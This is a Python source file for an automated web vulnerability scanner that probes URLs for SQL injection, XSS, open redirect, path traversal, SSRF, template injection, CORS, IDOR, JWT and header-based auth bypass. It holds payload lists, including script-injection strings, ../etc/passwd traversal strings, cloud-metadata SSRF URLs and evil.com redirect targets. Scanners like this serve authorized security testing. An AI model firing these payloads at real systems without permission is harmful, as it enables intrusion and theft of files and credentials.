"""
BLACKMIRROR-X Vulnerability Research Agent — Production Implementation

XBOW principle: proof over probability. Evidence required for every finding.

Tests: XSS, SQLi, Open Redirect, Path Traversal, Info Disclosure,
       Missing Headers, CORS, IDOR, Auth bypass, GraphQL, SSRF, SSTI,
       JWT, CRLF, Cookie flags
"""
import asyncio
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Any
import httpx
import structlog

logger = structlog.get_logger(__name__)

# ── SQL Error Patterns ────────────────────────────────────────────────────────
SQLI_ERRORS = [
    # MySQL
    "you have an error in your sql syntax",
    "mysql_fetch", "mysql_num_rows", "mysql_query",
    "supplied argument is not a valid mysql",
    "division by zero in",  # MySQL arithmetic
    # Generic SQL
    "sql syntax", "syntax error", "sql error",
    "unclosed quotation mark", "unterminated string",
    "quoted string not properly terminated",
    # PostgreSQL
    "pg_query()", "psql error", "pg_exec()",
    # MSSQL
    "odbc sql server", "odbc_connect()",
    "mssql_query", "sqlsrv_query",
    # Oracle
    "ora-01756", "ora-00933", "ora-00907",
    # SQLite
    "sqlite3.operationalerror", "sqlite_error",
    # Generic DB
    "warning: mysql", "warning: pg_",
    "database error", "db error",
    "failed to run query",
    "incorrect integer value",  # MySQL type error
    "column count doesn't match",
]

# ── XSS Payloads (safe canary-based) ─────────────────────────────────────────
XSS_CANARY = "GlassWing7711"  # Unique marker we look for in response

XSS_PAYLOADS = [
    f'<script>alert("{XSS_CANARY}")</script>',
    f'"><script>alert("{XSS_CANARY}")</script>',
    f"<img src=x onerror=alert('{XSS_CANARY}')>",
    f"'><svg onload=alert('{XSS_CANARY}')>",
    f"javascript:alert('{XSS_CANARY}')",
    f'<details open ontoggle=alert("{XSS_CANARY}")>',
]

# ── SQLi Payloads (error-based first, then boolean) ───────────────────────────
SQLI_PAYLOADS_ERROR = [
    "'",                           # Simple quote — triggers error
    '"',                           # Double quote
    "\\",                          # Backslash
    "1'",                          # Integer param + quote
    "' OR '1'='1",                 # Classic
    "1 OR 1=1",                    # Integer-based
    "' AND SLEEP(0)--",            # Syntax check
    "1' ORDER BY 100--",           # ORDER BY error
    "' UNION SELECT null--",       # UNION error
    "1; SELECT 1",                 # Stacked query
]

SQLI_PAYLOADS_BOOLEAN = [
    ("1 AND 1=1", "1 AND 1=2"),    # Boolean differential pair
    ("1' AND '1'='1", "1' AND '1'='2"),
]

# ── Open Redirect Payloads ────────────────────────────────────────────────────
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "dest", "destination",
                    "go", "goto", "target", "redir", "forward", "r", "u",
                    "redirect_uri", "redirect_url", "return_url", "callback"]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
]

# ── Path Traversal ────────────────────────────────────────────────────────────
TRAVERSAL_PARAMS = ["file", "path", "dir", "include", "page", "template",
                     "document", "load", "read", "img", "image", "view"]

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
]

TRAVERSAL_MARKERS = ["root:x:", "root:!:", "daemon:", "bin:x:", "/bin/bash", "/sbin/nologin"]

# ── SSRF Payloads ────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
]

# ── SSTI Payloads ─────────────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("{7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%=7*7%>", "49"),
    ("{{7*'7'}}", "7777777"),  # Jinja2
    ("a{{7*7}}b", "a49b"),
]


class VulnResearchAgent:
    def __init__(
        self,
        scan_id: str,
        workspace_id: str,
        log_fn=None,
        rate_limit: float = 0.2,
    ):
        self.scan_id = scan_id
        self.workspace_id = workspace_id
        self.log_fn = log_fn or self._default_log
        self.rate_limit = rate_limit
        self._last_request = 0.0
        self._request_count = 0
        self._waf_detected = False
        self._client: Optional[httpx.AsyncClient] = None

    def _default_log(self, level: str, module: str, message: str, data=None):
        getattr(logger, level, logger.info)(message, module=module)

    async def log(self, level, module, message, data=None):
        try:
            self.log_fn(level, module, message, data)
        except Exception:
            pass

    async def _get_client(self) -> httpx.AsyncClient:
        if not self._client:
            self._client = httpx.AsyncClient(
                timeout=httpx.Timeout(10.0),
                follow_redirects=False,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                },
                verify=False,
            )
        return self._client

    async def close(self):
        if self._client:
            await self._client.aclose()
            self._client = None

    async def _request(self, method: str, url: str, **kwargs) -> Optional[httpx.Response]:
        elapsed = time.monotonic() - self._last_request
        if elapsed < self.rate_limit:
            await asyncio.sleep(self.rate_limit - elapsed)
        self._last_request = time.monotonic()
        self._request_count += 1
        try:
            client = await self._get_client()
            resp = await client.request(method, url, **kwargs)
            if resp.status_code == 429:
                await asyncio.sleep(5)
            return resp
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _make_finding(self, vuln_type: str, severity: str, url: str,
                      param: str, payload: str, evidence: str,
                      title: str = None, description: str = None,
                      request: str = None, response_snippet: str = None,
                      status_code: int = None) -> Dict:
        return {
            "title": title or f"{vuln_type.upper()} in '{param or 'endpoint'}'",
            "vuln_type": vuln_type,
            "severity": severity,
            "url": url,
            "parameter": param,
            "payload": payload,
            "evidence": evidence[:800],
            "description": description or f"Potential {vuln_type.upper()} vulnerability.",
            "request": request or f"GET {url}",
            "response_snippet": (response_snippet or "")[:300],
            "status_code": status_code,
            "waf_detected": self._waf_detected,
            "confidence_score": 0.8 if any(kw in evidence.lower() for kw in [
                "sql syntax", "you have an error", "reflected", "redirect", "traversal",
                "phpinfo", "49", "root:x:"
            ]) else 0.5,
        }

    async def test_url(self, url: str, parameters: List[str], config: Dict) -> List[Dict]:
        findings: List[Dict] = []
        tests = config.get("tests", [
            "xss", "sqli", "open_redirect", "path_traversal",
            "info_disclosure", "missing_headers", "cors", "ssrf", "ssti",
        ])

        if "sqli" in tests and parameters:
            findings.extend(await self.test_sqli(url, parameters))
        if "xss" in tests and parameters:
            findings.extend(await self.test_xss(url, parameters))
        if "open_redirect" in tests:
            findings.extend(await self.test_open_redirect(url, parameters))
        if "path_traversal" in tests:
            findings.extend(await self.test_path_traversal(url, parameters))
        if "ssrf" in tests and parameters:
            findings.extend(await self.test_ssrf(url, parameters))
        if "ssti" in tests and parameters:
            findings.extend(await self.test_ssti(url, parameters))
        if "cors" in tests:
            result = await self.test_cors(url)
            if result:
                findings.append(result)
        if "missing_headers" in tests:
            result = await self.test_missing_headers(url)
            if result:
                findings.extend(result)
        if "info_disclosure" in tests:
            findings.extend(await self.test_info_disclosure(url))
        if "idor" in tests and parameters:
            findings.extend(await self.test_idor(url, parameters))
        if "jwt" in tests:
            findings.extend(await self.test_jwt(url))
        if "graphql" in tests:
            findings.extend(await self.test_graphql(url))
        if "auth_bypass" in tests:
            findings.extend(await self.test_auth_bypass(url))

        if findings:
            await self.log("success", "vuln", f"✓ {len(findings)} findings at {url.split('?')[0]}")
        return findings

    # ── SQL Injection ─────────────────────────────────────────────────────────

    async def test_sqli(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []
        baseline = await self._request("GET", url)
        baseline_text = baseline.text if baseline else ""
        baseline_len = len(baseline_text)

        for param in parameters[:8]:
            found = False

            # Phase 1: Error-based detection
            for payload in SQLI_PAYLOADS_ERROR[:8]:
                if found:
                    break
                test_url = self._inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue
                body = resp.text.lower()

                for error in SQLI_ERRORS:
                    if error in body:
                        # Extract the error context
                        idx = body.find(error)
                        context = resp.text[max(0, idx-30):idx+100]
                        findings.append(self._make_finding(
                            "sqli", "critical", url, param, payload,
                            f"SQL error in response: {context}",
                            title=f"SQL Injection (Error-Based) in '{param}'",
                            description=(
                                f"Parameter '{param}' is not properly sanitized. "
                                f"SQL error message leaked: '{error}'. "
                                f"Payload: {payload}"
                            ),
                            request=f"GET {test_url}",
                            response_snippet=context,
                            status_code=resp.status_code,
                        ))
                        await self.log("success", "sqli",
                                       f"🔥 SQLi CONFIRMED: {param} — {error}")
                        found = True
                        break

            if found:
                continue

            # Phase 2: Boolean-based differential
            for true_payload, false_payload in SQLI_PAYLOADS_BOOLEAN:
                test_true = self._inject_param(url, param, true_payload)
                test_false = self._inject_param(url, param, false_payload)

                r_true = await self._request("GET", test_true)
                r_false = await self._request("GET", test_false)

                if not r_true or not r_false:
                    continue

                len_true = len(r_true.text)
                len_false = len(r_false.text)
                diff = abs(len_true - len_false)

                if diff > 100 and diff > baseline_len * 0.1 and baseline_len > 0:
                    findings.append(self._make_finding(
                        "sqli", "high", url, param,
                        f"TRUE: {true_payload} | FALSE: {false_payload}",
                        f"Boolean differential: TRUE={len_true}b, FALSE={len_false}b, diff={diff}b",
                        title=f"SQL Injection (Boolean-Based) in '{param}'",
                        description=(
                            f"Boolean condition changes response length significantly. "
                            f"TRUE payload: {true_payload}, FALSE payload: {false_payload}. "
                            f"Response difference: {diff} bytes."
                        ),
                        request=f"GET {test_true}",
                        response_snippet=r_true.text[:200],
                        status_code=r_true.status_code,
                    ))
                    await self.log("success", "sqli",
                                   f"🔥 Boolean SQLi: {param} diff={diff}b")
                    break

        return findings

    # ── XSS ──────────────────────────────────────────────────────────────────

    async def test_xss(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []

        for param in parameters[:8]:
            found = False
            for payload in XSS_PAYLOADS:
                if found:
                    break
                test_url = self._inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue

                body = resp.text
                body_lower = body.lower()

                # Check 1: Canary reflected
                if XSS_CANARY in body:
                    # Verify it's not HTML-encoded
                    encoded = (f"&lt;script&gt;" in body or
                               f"&quot;" in body or
                               f"&#" in body)
                    if not encoded:
                        # Find reflection context
                        idx = body.find(XSS_CANARY)
                        context = body[max(0, idx-50):idx+80]
                        findings.append(self._make_finding(
                            "xss", "high", url, param, payload,
                            f"Canary '{XSS_CANARY}' reflected unencoded. Context: {context}",
                            title=f"Reflected XSS in '{param}'",
                            description=(
                                f"Parameter '{param}' reflects user input without encoding. "
                                f"Canary string confirmed in response unescaped. "
                                f"Payload: {payload}"
                            ),
                            request=f"GET {test_url}",
                            response_snippet=context,
                            status_code=resp.status_code,
                        ))
                        await self.log("success", "xss",
                                       f"🔥 XSS CONFIRMED: {param} — canary reflected")
                        found = True
                    else:
                        # HTML-encoded — still medium (encoded reflection)
                        findings.append(self._make_finding(
                            "xss", "medium", url, param, payload,
                            f"Canary reflected but HTML-encoded (partial mitigation)",
                            title=f"Reflected Input in '{param}' (HTML-encoded)",
                            description="Input reflected but encoded — may still be exploitable in certain contexts.",
                            request=f"GET {test_url}",
                            status_code=resp.status_code,
                        ))
                        found = True

                # Check 2: Script tags or event handlers in response
                elif (f"onerror=" in body_lower and param in url) or \
                     (f"onload=" in body_lower and "svg" in body_lower):
                    findings.append(self._make_finding(
                        "xss", "medium", url, param, payload,
                        f"XSS execution pattern in response",
                        request=f"GET {test_url}",
                        status_code=resp.status_code,
                    ))
                    found = True

        return findings

    # ── Open Redirect ─────────────────────────────────────────────────────────

    async def test_open_redirect(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        all_params = list(urllib.parse.parse_qs(parsed.query).keys())
        redirect_params = [p for p in all_params if p.lower() in REDIRECT_PARAMS]

        # Also check path for redirect-looking URLs
        if not redirect_params:
            redirect_params = [p for p in all_params if any(
                kw in p.lower() for kw in ["redir", "url", "go", "next", "return"]
            )]
        if not redirect_params and parameters:
            redirect_params = [p for p in parameters if p.lower() in REDIRECT_PARAMS]

        for param in redirect_params[:3]:
            for payload in REDIRECT_PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue

                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("location", "")
                    if "evil.com" in location or location.startswith("//evil") or \
                            location.startswith("https://evil"):
                        findings.append(self._make_finding(
                            "open_redirect", "medium", url, param, payload,
                            f"Location: {location} — redirects to attacker-controlled domain",
                            title=f"Open Redirect via '{param}'",
                            description=(
                                f"Parameter '{param}' allows redirect to arbitrary external URL. "
                                f"Response Location: {location}"
                            ),
                            request=f"GET {test_url}",
                            response_snippet=f"Status: {resp.status_code}\nLocation: {location}",
                            status_code=resp.status_code,
                        ))
                        await self.log("success", "redirect",
                                       f"✓ Open redirect: {param} → {location}")
                        break

        return findings

    # ── Path Traversal ────────────────────────────────────────────────────────

    async def test_path_traversal(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        all_params = list(urllib.parse.parse_qs(parsed.query).keys())
        traversal_params = [p for p in all_params if p.lower() in TRAVERSAL_PARAMS]
        if not traversal_params and parameters:
            traversal_params = [p for p in parameters if p.lower() in TRAVERSAL_PARAMS]

        for param in traversal_params[:3]:
            for payload in TRAVERSAL_PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue
                body = resp.text
                for marker in TRAVERSAL_MARKERS:
                    if marker in body:
                        findings.append(self._make_finding(
                            "path_traversal", "high", url, param, payload,
                            f"File content marker '{marker}' in response",
                            title=f"Path Traversal in '{param}'",
                            description=(
                                f"Parameter '{param}' allows reading files outside web root. "
                                f"/etc/passwd marker detected in response."
                            ),
                            request=f"GET {test_url}",
                            response_snippet=body[:300],
                            status_code=resp.status_code,
                        ))
                        await self.log("success", "traversal",
                                       f"🔥 Path traversal: {param}")
                        break

        return findings

    # ── Info Disclosure ───────────────────────────────────────────────────────

    async def test_info_disclosure(self, url: str) -> List[Dict]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # phpinfo
        phpinfo_paths = ["/phpinfo.php", "/info.php", "/php_info.php", "/test.php"]
        for path in phpinfo_paths:
            resp = await self._request("GET", base + path)
            if resp and resp.status_code == 200 and "phpinfo()" in resp.text:
                findings.append(self._make_finding(
                    "info_disclosure", "medium", base + path, "", "",
                    f"phpinfo() page exposed at {path}",
                    title="phpinfo() Page Exposed",
                    description=f"PHP configuration page exposed at {path}. Reveals server config, PHP version, loaded modules.",
                    response_snippet=resp.text[:200],
                    status_code=200,
                ))
                await self.log("success", "info", f"✓ phpinfo: {path}")

        # Server version in headers
        resp = await self._request("GET", url)
        if resp:
            server = resp.headers.get("server", "")
            x_powered = resp.headers.get("x-powered-by", "")
            if server and any(v in server.lower() for v in ["apache/", "nginx/", "iis/"]):
                findings.append(self._make_finding(
                    "info_disclosure", "low", url, "", "",
                    f"Server version disclosed: {server}",
                    title="Server Version Disclosed",
                    description=f"Server header reveals version: {server}",
                    response_snippet=f"Server: {server}",
                    status_code=resp.status_code,
                ))
            if x_powered:
                findings.append(self._make_finding(
                    "info_disclosure", "low", url, "", "",
                    f"Technology disclosed: X-Powered-By: {x_powered}",
                    title="Technology Stack Disclosed",
                    description=f"X-Powered-By header reveals technology: {x_powered}",
                    response_snippet=f"X-Powered-By: {x_powered}",
                    status_code=resp.status_code,
                ))

        # Directory listing
        dir_paths = ["/images/", "/uploads/", "/backup/", "/files/", "/temp/"]
        for path in dir_paths:
            resp = await self._request("GET", base + path)
            if resp and resp.status_code == 200:
                body = resp.text.lower()
                if "index of" in body or "directory listing" in body or \
                   ("<title>index of" in body):
                    findings.append(self._make_finding(
                        "info_disclosure", "medium", base + path, "", "",
                        f"Directory listing at {path}",
                        title=f"Directory Listing Enabled at {path}",
                        description=f"Web server returns directory listing for {path}.",
                        response_snippet=resp.text[:300],
                        status_code=200,
                    ))

        return findings

    # ── Missing Security Headers ───────────────────────────────────────────────

    async def test_missing_headers(self, url: str) -> List[Dict]:
        findings = []
        resp = await self._request("GET", url)
        if not resp:
            return []

        headers = {k.lower(): v for k, v in resp.headers.items()}
        missing = []

        if "x-frame-options" not in headers and "content-security-policy" not in headers:
            missing.append("X-Frame-Options (clickjacking protection missing)")
        if "x-content-type-options" not in headers:
            missing.append("X-Content-Type-Options: nosniff (MIME sniffing)")
        if "strict-transport-security" not in headers and url.startswith("https"):
            missing.append("Strict-Transport-Security (HSTS)")

        # Insecure cookies
        set_cookie = resp.headers.get("set-cookie", "")
        if set_cookie:
            if "httponly" not in set_cookie.lower():
                findings.append(self._make_finding(
                    "cookie_security", "medium", url, "", "",
                    f"Cookie missing HttpOnly flag: {set_cookie[:100]}",
                    title="Insecure Cookie — Missing HttpOnly Flag",
                    description="Session cookie accessible via JavaScript (XSS can steal it).",
                    response_snippet=f"Set-Cookie: {set_cookie[:100]}",
                    status_code=resp.status_code,
                ))
            if "secure" not in set_cookie.lower() and url.startswith("http://"):
                findings.append(self._make_finding(
                    "cookie_security", "low", url, "", "",
                    f"Cookie missing Secure flag: {set_cookie[:100]}",
                    title="Insecure Cookie — Missing Secure Flag",
                    description="Cookie can be transmitted over insecure HTTP connection.",
                    response_snippet=f"Set-Cookie: {set_cookie[:100]}",
                    status_code=resp.status_code,
                ))

        if missing:
            findings.append(self._make_finding(
                "missing_headers", "low", url, "", "",
                f"Missing: {'; '.join(missing)}",
                title="Missing Security Headers",
                description=f"Response missing: {', '.join(missing)}",
                response_snippet=str(dict(list(headers.items())[:5])),
                status_code=resp.status_code,
            ))

        return findings

    # ── CORS ──────────────────────────────────────────────────────────────────

    async def test_cors(self, url: str) -> Optional[Dict]:
        resp = await self._request("GET", url, headers={"Origin": "https://evil.com"})
        if not resp:
            return None
        acao = resp.headers.get("access-control-allow-origin", "")
        acac = resp.headers.get("access-control-allow-credentials", "")
        if acao == "*":
            return self._make_finding(
                "cors", "medium", url, "", "",
                f"Access-Control-Allow-Origin: * (wildcard)",
                title="CORS — Wildcard Origin Allowed",
                description="CORS wildcard allows any origin to read responses.",
                response_snippet=f"ACAO: {acao}",
                status_code=resp.status_code,
            )
        if "evil.com" in acao and "true" in acac.lower():
            return self._make_finding(
                "cors", "high", url, "", "",
                f"ACAO: {acao} + ACAC: {acac} — reflects arbitrary origin with credentials",
                title="CORS — Arbitrary Origin with Credentials",
                description="Server reflects attacker's origin and allows credentials — full CORS bypass.",
                response_snippet=f"ACAO: {acao}\nACAC: {acac}",
                status_code=resp.status_code,
            )
        return None

    # ── SSRF ──────────────────────────────────────────────────────────────────

    async def test_ssrf(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []
        ssrf_params = [p for p in parameters if any(
            kw in p.lower() for kw in ["url", "uri", "path", "redirect", "next",
                                        "dest", "callback", "host", "src", "proxy"]
        )]
        if not ssrf_params:
            return findings

        for param in ssrf_params[:3]:
            for payload in SSRF_PAYLOADS[:4]:
                test_url = self._inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue
                body = resp.text
                if any(kw in body for kw in ["ami-id", "instance-id", "computeMetadata",
                                               "iam/security-credentials", "root:x:"]):
                    findings.append(self._make_finding(
                        "ssrf", "critical", url, param, payload,
                        f"Internal content in response: {body[:200]}",
                        title=f"SSRF — Internal Resource Access via '{param}'",
                        description="Server-side request forgery — internal endpoint accessible.",
                        request=f"GET {test_url}",
                        response_snippet=body[:300],
                        status_code=resp.status_code,
                    ))
                    break

        return findings

    # ── SSTI ──────────────────────────────────────────────────────────────────

    async def test_ssti(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []
        for param in parameters[:5]:
            for payload, expected in SSTI_PAYLOADS:
                test_url = self._inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue
                if expected in resp.text:
                    findings.append(self._make_finding(
                        "ssti", "critical", url, param, payload,
                        f"Expression '{payload}' evaluated to '{expected}'",
                        title=f"Server-Side Template Injection in '{param}'",
                        description=f"Template expression evaluated: {payload}={expected}",
                        request=f"GET {test_url}",
                        response_snippet=resp.text[:300],
                        status_code=resp.status_code,
                    ))
                    break
        return findings

    # ── IDOR ──────────────────────────────────────────────────────────────────

    async def test_idor(self, url: str, parameters: List[str]) -> List[Dict]:
        findings = []
        id_params = [p for p in parameters if any(
            kw in p.lower() for kw in ["id", "uid", "user", "account", "order",
                                        "record", "doc", "file", "item", "product"]
        )]
        for param in id_params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            current_val = (qs.get(param) or ["1"])[0]

            # Try adjacent IDs
            try:
                curr_int = int(current_val)
                test_vals = [str(curr_int + 1), str(curr_int - 1), "0", "99999"]
            except ValueError:
                continue

            baseline = await self._request("GET", url)
            if not baseline:
                continue

            for test_val in test_vals[:2]:
                test_url = self._inject_param(url, param, test_val)
                resp = await self._request("GET", test_url)
                if not resp:
                    continue
                if resp.status_code == 200 and len(resp.text) > 100:
                    diff = abs(len(resp.text) - len(baseline.text))
                    if diff > 50:
                        findings.append(self._make_finding(
                            "idor", "high", url, param, test_val,
                            f"ID {test_val} returns {resp.status_code} with {len(resp.text)} bytes",
                            title=f"Potential IDOR via '{param}'",
                            description=f"Different ID ({test_val}) returns content — verify object-level auth.",
                            request=f"GET {test_url}",
                            response_snippet=resp.text[:200],
                            status_code=resp.status_code,
                        ))
                        break

        return findings

    # ── JWT ───────────────────────────────────────────────────────────────────

    async def test_jwt(self, url: str) -> List[Dict]:
        findings = []
        resp = await self._request("GET", url)
        if not resp:
            return []
        # Check for JWT in response cookies or headers
        body = resp.text
        auth_header = resp.headers.get("authorization", "")
        set_cookie = resp.headers.get("set-cookie", "")
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
        matches = re.findall(jwt_pattern, body + set_cookie + auth_header)
        if matches:
            token = matches[0]
            # Check if using weak algorithm by decoding header
            try:
                import base64, json as _json
                header_b64 = token.split(".")[0]
                header_b64 += "=" * (4 - len(header_b64) % 4)
                header = _json.loads(base64.urlsafe_b64decode(header_b64))
                alg = header.get("alg", "")
                if alg.upper() == "NONE":
                    findings.append(self._make_finding(
                        "jwt_vulnerability", "critical", url, "", token[:20] + "...",
                        f"JWT using alg:none — signature not verified",
                        title="JWT Algorithm None Attack",
                        description="JWT header specifies alg:none — token signature not validated.",
                        response_snippet=str(header),
                    ))
                elif alg in ("HS256", "HS384", "HS512"):
                    findings.append(self._make_finding(
                        "jwt_vulnerability", "low", url, "", token[:20] + "...",
                        f"JWT found using {alg}",
                        title=f"JWT Detected — {alg}",
                        description=f"JWT token using {alg}. Verify secret strength and expiry.",
                        response_snippet=str(header),
                    ))
            except Exception:
                pass
        return findings

    # ── Auth Bypass ───────────────────────────────────────────────────────────

    async def test_auth_bypass(self, url: str) -> List[Dict]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        path = parsed.path.lower()

        if not any(kw in path for kw in ["admin", "login", "auth", "user", "account",
                                           "dashboard", "panel", "manage", "control"]):
            return findings

        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
        ]
        resp_baseline = await self._request("GET", url)
        if not resp_baseline:
            return findings

        for headers in bypass_headers[:2]:
            resp = await self._request("GET", url, headers=headers)
            if not resp:
                continue
            if resp.status_code == 200 and resp_baseline.status_code in (401, 403):
                findings.append(self._make_finding(
                    "auth_bypass", "critical", url, "", str(headers),
                    f"Auth bypass: {resp_baseline.status_code}→{resp.status_code} with {headers}",
                    title="Authentication Bypass via Header Injection",
                    description=f"Adding {headers} bypasses authentication.",
                    response_snippet=resp.text[:200],
                    status_code=resp.status_code,
                ))
        return findings

    # ── GraphQL ───────────────────────────────────────────────────────────────

    async def test_graphql(self, url: str) -> List[Dict]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        if "graphql" not in parsed.path.lower():
            return findings

        resp = await self._request("POST", url,
            json={"query": "{__schema{types{name}}}"},
            headers={"Content-Type": "application/json"})
        if not resp:
            return findings

        try:
            data = resp.json()
            if "data" in data and "__schema" in str(data):
                findings.append(self._make_finding(
                    "graphql", "medium", url, "", "{__schema{types{name}}}",
                    "GraphQL introspection enabled — schema disclosed",
                    title="GraphQL Introspection Enabled",
                    description="GraphQL introspection reveals full API schema.",
                    response_snippet=str(data)[:300],
                    status_code=resp.status_code,
                ))
        except Exception:
            pass
        return findings
